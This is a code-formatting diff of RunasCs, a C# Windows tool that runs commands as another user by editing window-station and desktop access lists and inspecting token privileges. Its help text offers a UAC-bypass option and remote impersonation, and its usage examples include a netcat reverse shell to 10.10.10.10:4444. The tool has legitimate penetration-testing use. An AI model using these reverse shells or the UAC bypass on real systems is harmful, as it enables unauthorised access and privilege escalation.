-    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess);
-    
+    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta, [MarshalAs(UnmanagedType.Bool)] bool fInherit, ACCESS_MASK dwDesiredAccess);
+
     [DllImport("user32.dll")]
     private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess);
-    
+
     [return: MarshalAs(UnmanagedType.Bool)]
     [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern bool CloseWindowStation(IntPtr hWinsta);
-    
-    [DllImport("user32.dll", SetLastError=true)]
+
+    [DllImport("user32.dll", SetLastError = true)]
     private static extern bool CloseDesktop(IntPtr hDesktop);
-    
+
     [DllImport("user32.dll", SetLastError = true)]
     private static extern bool SetProcessWindowStation(IntPtr hWinSta);
- 
+
     [DllImport("advapi32.dll")]
     private static extern IntPtr FreeSid(IntPtr pSid);
-    
+
     [DllImport("user32.dll", SetLastError = true)]
-	private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);
+    private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);
 
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);
+    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl, [MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);
 
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);
 
-    [DllImport("advapi32.dll", SetLastError=true)]
+    [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision);
 
     [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern int GetLengthSid(IntPtr pSID);
-    
+
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
-    
+
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr);
-    
+
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);
-    
+
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid);
-    
-    [DllImport("advapi32.dll", SetLastError=true)]
-    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
-    
-    [DllImport("user32.dll", SetLastError = true)]
-	private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);
 
-    [DllImport("advapi32.dll", SetLastError=true)]
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid);
-    
-    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
+
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
-    
+
     private IntPtr hWinsta;
     private IntPtr hDesktop;
     private IntPtr userSid;
-    
-    private IntPtr GetUserSid(string domain, string username){
+
+    private IntPtr GetUserSid(string domain, string username)
+    {
         IntPtr userSid = IntPtr.Zero;
         string fqan = "";//Fully qualified account names
-        byte [] Sid = null;
+        byte[] Sid = null;
         uint cbSid = 0;
         StringBuilder referencedDomainName = new StringBuilder();
         uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
         SID_NAME_USE sidUse;
         int err = NO_ERROR;
-        
-        if(domain != "" && domain != ".")
+
+        if (domain != "" && domain != ".")
             fqan = domain + "\\" + username;
         else
             fqan = username;
-        
-        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
+
+        if (!LookupAccountName(null, fqan, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out sidUse))
         {
             err = Marshal.GetLastWin32Error();
             if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
@@ -980,11 +1016,12 @@ public class WindowStationDACL{
                 Sid = new byte[cbSid];
                 referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                 err = NO_ERROR;
-                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
+                if (!LookupAccountName(null, fqan, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out sidUse))
                     err = Marshal.GetLastWin32Error();
             }
         }
-        else{
+        else
+        {
             string error = "The username " + fqan + " has not been found. ";
             throw new RunasCsException(error + "LookupAccountName", true);
         }
@@ -993,16 +1030,18 @@ public class WindowStationDACL{
             userSid = Marshal.AllocHGlobal((int)cbSid);
             Marshal.Copy(Sid, 0, userSid, (int)cbSid);
         }
-        else{
+        else
+        {
             string error = "The username " + fqan + " has not been found. ";
             throw new RunasCsException(error + "LookupAccountName", true);
         }
         return userSid;
     }
-    
+
     //Big thanks to Vanara project
     //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs#L4656
-    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){
+    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize)
+    {
         int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint));
         ACE_HEADER AceHeader = new ACE_HEADER();
         AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE;
@@ -1021,7 +1060,8 @@ public class WindowStationDACL{
         Marshal.FreeHGlobal(pNewAcePtr);
     }
 
-    private void AddAceToWindowStation(){
+    private void AddAceToWindowStation()
+    {
         uint cbSd = 0;
         bool fDaclPresent = false;
         bool fDaclExist = false;
@@ -1032,7 +1072,7 @@ public class WindowStationDACL{
         uint cbNewDacl = 0;
         uint cbNewAce = 0;
         IntPtr pNewDacl = IntPtr.Zero;
-        
+
         ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
         SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
         // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
@@ -1067,7 +1107,7 @@ public class WindowStationDACL{
             }
             cbDacl = aclSizeInfo.AclBytesInUse;
         }
-        
+
         // Allocate memory for the new security descriptor.
         pNewSd = Marshal.AllocHGlobal((int)cbSd);
         // Initialize the new security descriptor.
@@ -1075,13 +1115,13 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("InitializeSecurityDescriptor", true);
         }
-        
+
         // Compute the size of a DACL to be added to the new security descriptor.
         cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
-        if(cbDacl == 0)
-            cbNewDacl =  8 + (cbNewAce*2);//8 = sizeof(ACL)
+        if (cbDacl == 0)
+            cbNewDacl = 8 + (cbNewAce * 2);//8 = sizeof(ACL)
         else
-            cbNewDacl = cbDacl + (cbNewAce*2);
+            cbNewDacl = cbDacl + (cbNewAce * 2);
 
         // Allocate memory for the new DACL.
         pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
@@ -1090,7 +1130,7 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("InitializeAcl", true);
         }
-        
+
         // If the original DACL is present, copy it to the new DACL.
         if (fDaclPresent)
         {
@@ -1111,7 +1151,7 @@ public class WindowStationDACL{
                 }
             }
         }
-        
+
         AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE, cbNewAce);
         AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce);
         // Assign the new DACL to the new security descriptor.
@@ -1124,13 +1164,14 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("SetUserObjectSecurity", true);
         }
-        
+
         Marshal.FreeHGlobal(pSd);
         Marshal.FreeHGlobal(pNewSd);
         Marshal.FreeHGlobal(pNewDacl);
     }
 
-    private void AddAceToDesktop(){
+    private void AddAceToDesktop()
+    {
         uint cbSd = 0;
         bool fDaclPresent = false;
         bool fDaclExist = false;
@@ -1141,7 +1182,7 @@ public class WindowStationDACL{
         uint cbNewDacl = 0;
         uint cbNewAce = 0;
         IntPtr pNewDacl = IntPtr.Zero;
-        
+
         ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
         SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
         // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
@@ -1176,7 +1217,7 @@ public class WindowStationDACL{
             }
             cbDacl = aclSizeInfo.AclBytesInUse;
         }
-        
+
         // Allocate memory for the new security descriptor.
         pNewSd = Marshal.AllocHGlobal((int)cbSd);
         // Initialize the new security descriptor.
@@ -1184,11 +1225,11 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("InitializeSecurityDescriptor", true);
         }
-        
+
         // Compute the size of a DACL to be added to the new security descriptor.
         cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
-        if(cbDacl == 0)
-            cbNewDacl =  8 + cbNewAce;//8 = sizeof(ACL)
+        if (cbDacl == 0)
+            cbNewDacl = 8 + cbNewAce;//8 = sizeof(ACL)
         else
             cbNewDacl = cbDacl + cbNewAce;
 
@@ -1199,7 +1240,7 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("InitializeAcl", true);
         }
-        
+
         // If the original DACL is present, copy it to the new DACL.
         if (fDaclPresent)
         {
@@ -1220,13 +1261,13 @@ public class WindowStationDACL{
                 }
             }
         }
-        
+
         // Add a new ACE to the new DACL.
         if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))
         {
             throw new RunasCsException("AddAccessAllowedAce", true);
         }
-        
+
         // Assign the new DACL to the new security descriptor.
         if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
         {
@@ -1237,7 +1278,7 @@ public class WindowStationDACL{
         {
             throw new RunasCsException("SetUserObjectSecurity", true);
         }
-        
+
         Marshal.FreeHGlobal(pSd);
         Marshal.FreeHGlobal(pNewSd);
         Marshal.FreeHGlobal(pNewDacl);
@@ -1249,20 +1290,22 @@ public class WindowStationDACL{
         this.userSid = IntPtr.Zero;
     }
 
-    public string AddAclToActiveWindowStation(string domain, string username, int logonType){
+    public string AddAclToActiveWindowStation(string domain, string username, int logonType)
+    {
         string lpDesktop = "";
         byte[] stationNameBytes = new byte[256];
         string stationName = "";
         uint lengthNeeded = 0;
         IntPtr hWinstaSave = GetProcessWindowStation();
-        if(hWinstaSave == IntPtr.Zero)
+        if (hWinstaSave == IntPtr.Zero)
         {
             throw new RunasCsException("GetProcessWindowStation", true);
         }
-        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){
+        if (!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded))
+        {
             throw new RunasCsException("GetUserObjectInformation", true);
         }
-        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);
+        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded - 1);
         // this should be avoided with the LOGON32_LOGON_NEW_CREDENTIALS logon type or some bug can happen in LookupAccountName()
         if (logonType != 9)
         {
@@ -1291,16 +1334,17 @@ public class WindowStationDACL{
         lpDesktop = stationName + "\\Default";
         return lpDesktop;
     }
-    
+
     public void CleanupHandles()
     {
-        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
-        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
-        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid);
+        if (this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
+        if (this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
+        if (this.userSid != IntPtr.Zero) FreeSid(this.userSid);
     }
 }
 
-public static class AccessToken{
+public static class AccessToken
+{
     // Mandatory Label SIDs (integrity levels)
     private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
     private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
@@ -1328,18 +1372,18 @@ public static class AccessToken{
         TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
         TOKEN_ADJUST_SESSIONID);
 
-    [DllImport("advapi32.dll", SetLastError=true)]
-    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
-    
-    [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );
+    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName);
 
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
 
     [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,  int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);
+    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5, int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);
 
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength);
@@ -1359,7 +1403,7 @@ public static class AccessToken{
     [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
-    
+
     [DllImport("Kernel32.dll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr handle);
 
@@ -1501,30 +1545,33 @@ public static class AccessToken{
         public LUID_AND_ATTRIBUTES[] Privileges;
     }
 
-    private static string convertAttributeToString(UInt32 attribute){
-        if(attribute == 0)
+    private static string convertAttributeToString(UInt32 attribute)
+    {
+        if (attribute == 0)
             return "Disabled";
-        if(attribute == 1)
+        if (attribute == 1)
             return "Enabled Default";
-        if(attribute == 2)
+        if (attribute == 2)
             return "Enabled";
-        if(attribute == 3)
+        if (attribute == 3)
             return "Enabled|Enabled Default";
         return "Error";
     }
 
-    public static List<string[]> GetTokenPrivileges(IntPtr tHandle){
+    public static List<string[]> GetTokenPrivileges(IntPtr tHandle)
+    {
         List<string[]> privileges = new List<string[]>();
-        uint TokenInfLength=0;
-        bool Result; 
+        uint TokenInfLength = 0;
+        bool Result;
         //Get TokenInformation length in TokenInfLength
         Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
-        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) ;
-        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) ; 
+        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength);
+        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength);
         if (Result == false)
             throw new RunasCsException("GetTokenInformation", true);
-        TOKEN_PRIVILEGES TokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) ;
-        for(int i=0;i<TokenPrivileges.PrivilegeCount;i++){
+        TOKEN_PRIVILEGES TokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_PRIVILEGES));
+        for (int i = 0; i < TokenPrivileges.PrivilegeCount; i++)
+        {
             StringBuilder sb = new StringBuilder();
             int luidNameLen = 0;
             LUID luid = new LUID();
@@ -1537,14 +1584,15 @@ public static class AccessToken{
             Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen);// call again to get the name
             if (Result == false)
                 throw new RunasCsException("LookupPrivilegeName", true);
-            privilegeStatus[0]=sb.ToString();
-            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
+            privilegeStatus[0] = sb.ToString();
+            privilegeStatus[1] = convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
             privileges.Add(privilegeStatus);
         }
         return privileges;
     }
 
-    public static bool IsFilteredUACToken(IntPtr hToken) {
+    public static bool IsFilteredUACToken(IntPtr hToken)
+    {
         bool tokenIsFiltered = false;
         int tokenInfLength = 0;
         // GetTokenInformation(TokenElevation) does not return true in all cases, e.g. when having an High IL token with SeImpersonate privilege
@@ -1555,11 +1603,13 @@ public static class AccessToken{
         if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, tokenElevationPtr, tokenInfLength, out tokenInfLength))
             throw new RunasCsException("GetTokenInformation TokenElevation", true);
         TOKEN_ELEVATION tokenElevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenElevationPtr, typeof(TOKEN_ELEVATION));
-        if (tokenElevation.TokenIsElevated > 0) {
+        if (tokenElevation.TokenIsElevated > 0)
+        {
             tokenIsFiltered = false;
             Marshal.FreeHGlobal(tokenElevationPtr);
         }
-        else {
+        else
+        {
             tokenInfLength = 0;
             GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, tokenInfLength, out tokenInfLength);
             IntPtr tokenElevationTypePtr = Marshal.AllocHGlobal(tokenInfLength);
@@ -1689,7 +1739,7 @@ Positional arguments:
 
 Optional arguments:
     -d, --domain domain
-                            domain of the user, if in a domain. 
+                            domain of the user, if in a domain.
                             Default: """"
     -f, --function create_process_function
                             CreateProcess function to use. When not specified
@@ -1705,7 +1755,7 @@ Optional arguments:
                             the waiting time (in ms) for the created process.
                             This will halt RunasCs until the spawned process
                             ends and sent the output back to the caller.
-                            If you set 0 no output will be retrieved and a 
+                            If you set 0 no output will be retrieved and a
                             background process will be created.
                             Default: ""120000""
     -r, --remote host:port
@@ -1717,11 +1767,11 @@ Optional arguments:
                             environment variables correctly set.
                             WARNING: If non-existent, it creates the user profile
                             directory in the C:\Users folder.
-    -b, --bypass-uac     
+    -b, --bypass-uac
                             try a UAC bypass to spawn a process without
                             token limitations (not filtered).
-    -i, --remote-impersonation     
-                            spawn a new process and assign the token of the 
+    -i, --remote-impersonation
+                            spawn a new process and assign the token of the
                             logged on user to the main thread.
 
 Examples:
@@ -1733,18 +1783,18 @@ Examples:
         RunasCs.exe user1 password1 ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
-    Run a command simulating the /netonly flag of runas.exe 
+    Run a command simulating the /netonly flag of runas.exe
         RunasCs.exe user1 password1 ""cmd /c whoami /all"" -l 9
     Run a command as an Administrator bypassing UAC
         RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac
     Run a command as an Administrator through remote impersonation
-        RunasCs.exe adm1 password1 ""cmd /c echo admin > C:\Windows\admin"" -l 8 --remote-impersonation 
+        RunasCs.exe adm1 password1 ""cmd /c echo admin > C:\Windows\admin"" -l 8 --remote-impersonation
 ";
-    
+
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
-    private static Dictionary<int,string> getLogonTypeDict()
+    private static Dictionary<int, string> getLogonTypeDict()
     {
-        Dictionary<int,string> logonTypes = new Dictionary<int,string>();
+        Dictionary<int, string> logonTypes = new Dictionary<int, string>();
         logonTypes.Add(2, "Interactive");
         logonTypes.Add(3, "Network");
         logonTypes.Add(4, "Batch");
@@ -1752,15 +1802,15 @@ Examples:
         logonTypes.Add(7, "Unlock");
         logonTypes.Add(8, "NetworkCleartext");
         logonTypes.Add(9, "NewCredentials");
-        logonTypes.Add(10,"RemoteInteractive");
-        logonTypes.Add(11,"CachedInteractive");
+        logonTypes.Add(10, "RemoteInteractive");
+        logonTypes.Add(11, "CachedInteractive");
         return logonTypes;
     }
 
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
-    private static Dictionary<int,string> getCreateProcessFunctionDict()
+    private static Dictionary<int, string> getCreateProcessFunctionDict()
     {
-        Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>();
+        Dictionary<int, string> createProcessFunctions = new Dictionary<int, string>();
         createProcessFunctions.Add(0, "CreateProcessAsUserW");
         createProcessFunctions.Add(1, "CreateProcessWithTokenW");
         createProcessFunctions.Add(2, "CreateProcessWithLogonW");
@@ -1771,14 +1821,16 @@ Examples:
     {
         return param == "-h" || param == "--help" || param == "/?";
     }
-    
+
     private static uint ValidateProcessTimeout(string timeout)
     {
         uint processTimeout = 120000;
-        try {
+        try
+        {
             processTimeout = Convert.ToUInt32(timeout);
         }
-        catch {
+        catch
+        {
             throw new RunasCsException("Invalid process_timeout value: " + timeout);
         }
         return processTimeout;
@@ -1787,50 +1839,59 @@ Examples:
     private static string[] ValidateRemote(string remote)
     {
         string[] split = remote.Split(':');
-        if( split.Length != 2 ) {
+        if (split.Length != 2)
+        {
             string error = "Invalid remote value: " + remote + "\r\n";
             error += "[-] Expected format: 'host:port'";
             throw new RunasCsException(error);
         }
         return split;
     }
-    
+
     private static int ValidateLogonType(string type)
     {
         int logonType = 3;
-        Dictionary<int,string> logonTypes = getLogonTypeDict();
+        Dictionary<int, string> logonTypes = getLogonTypeDict();
 
-        try {
+        try
+        {
             logonType = Convert.ToInt32(type);
-            if( !logonTypes.ContainsKey(logonType) ) {
+            if (!logonTypes.ContainsKey(logonType))
+            {
                 throw new System.ArgumentException("");
             }
         }
-        catch {
+        catch
+        {
             string error = "Invalid logon_type value: " + type + "\r\n";
             error += "[-] Allowed values are:\r\n";
-            foreach(KeyValuePair<int,string> item in logonTypes) {
+            foreach (KeyValuePair<int, string> item in logonTypes)
+            {
                 error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
             }
             throw new RunasCsException(error);
         }
         return logonType;
     }
-    
+
     private static int ValidateCreateProcessFunction(string function)
     {
         int createProcessFunction = 2;
-        Dictionary<int,string> createProcessFunctions = getCreateProcessFunctionDict();
-        try {
+        Dictionary<int, string> createProcessFunctions = getCreateProcessFunctionDict();
+        try
+        {
             createProcessFunction = Convert.ToInt32(function);
-            if( createProcessFunction < 0 || createProcessFunction > 2 ) {
+            if (createProcessFunction < 0 || createProcessFunction > 2)
+            {
                 throw new System.ArgumentException("");
             }
         }
-        catch {
+        catch
+        {
             string error = "Invalid createProcess function: " + function + "\r\n";
             error += "[-] Allowed values are:\r\n";
-            foreach(KeyValuePair<int,string> item in createProcessFunctions) {
+            foreach (KeyValuePair<int, string> item in createProcessFunctions)
+            {
                 error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
             }
             throw new RunasCsException(error);
@@ -1841,7 +1902,7 @@ Examples:
     private static int DefaultCreateProcessFunction()
     {
         int createProcessFunction = 2;
-        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;        
+        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;
         List<string[]> privs = new List<string[]>();
         privs = AccessToken.GetTokenPrivileges(currentTokenHandle);
         bool SeAssignPrimaryTokenPrivilegeAssigned = false;
@@ -1849,16 +1910,16 @@ Examples:
         foreach (string[] s in privs)
         {
             string privilege = s[0];
-            if(privilege == "SeAssignPrimaryTokenPrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.Medium)
+            if (privilege == "SeAssignPrimaryTokenPrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.Medium)
                 SeAssignPrimaryTokenPrivilegeAssigned = true;
-            if(privilege == "SeImpersonatePrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.High)
+            if (privilege == "SeImpersonatePrivilege" && AccessToken.GetTokenIntegrityLevel(currentTokenHandle) >= AccessToken.IntegrityLevel.High)
                 SeImpersonatePrivilegeAssigned = true;
         }
         if (SeAssignPrimaryTokenPrivilegeAssigned)
             createProcessFunction = 0;
-        else 
+        else
             if (SeImpersonatePrivilegeAssigned)
-                createProcessFunction = 1;
+            createProcessFunction = 1;
         return createProcessFunction;
     }
 
@@ -1877,9 +1938,11 @@ Examples:
         uint processTimeout = 120000;
         int logonType = 2, createProcessFunction = DefaultCreateProcessFunction();
         bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false;
-        
-        try {
-            for(int ctr = 0; ctr < args.Length; ctr++) {
+
+        try
+        {
+            for (int ctr = 0; ctr < args.Length; ctr++)
+            {
                 switch (args[ctr])
                 {
 
@@ -1907,7 +1970,7 @@ Examples:
                     case "--remote":
                         remote = ValidateRemote(args[++ctr]);
                         break;
-                    
+
                     case "-p":
                     case "--force-profile":
                         forceUserProfileCreation = true;
@@ -1928,13 +1991,18 @@ Examples:
                         break;
                 }
             }
-        } catch(System.IndexOutOfRangeException) {
+        }
+        catch (System.IndexOutOfRangeException)
+        {
             return "[-] Invalid arguments. Use --help for additional help.";
-        } catch(RunasCsException e) {
+        }
+        catch (RunasCsException e)
+        {
             return String.Format("{0}", e.Message);
         }
 
-        if( positionals.Count < 3 ) {
+        if (positionals.Count < 3)
+        {
             return "[-] Not enough arguments. 3 Arguments required. Use --help for additional help.";
         }
 
@@ -1942,14 +2010,18 @@ Examples:
         password = positionals[1];
         cmd = positionals[2];
 
-        if( remote != null ) {
+        if (remote != null)
+        {
             processTimeout = 0;
         }
 
         RunasCs invoker = new RunasCs();
-        try {
+        try
+        {
             output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation);
-        } catch(RunasCsException e) {
+        }
+        catch (RunasCsException e)
+        {
             invoker.CleanupHandles();
             output = String.Format("{0}", e.Message);
         }
@@ -1966,4 +2038,3 @@ class MainClass
         Console.Out.Flush();
     }
 }
-
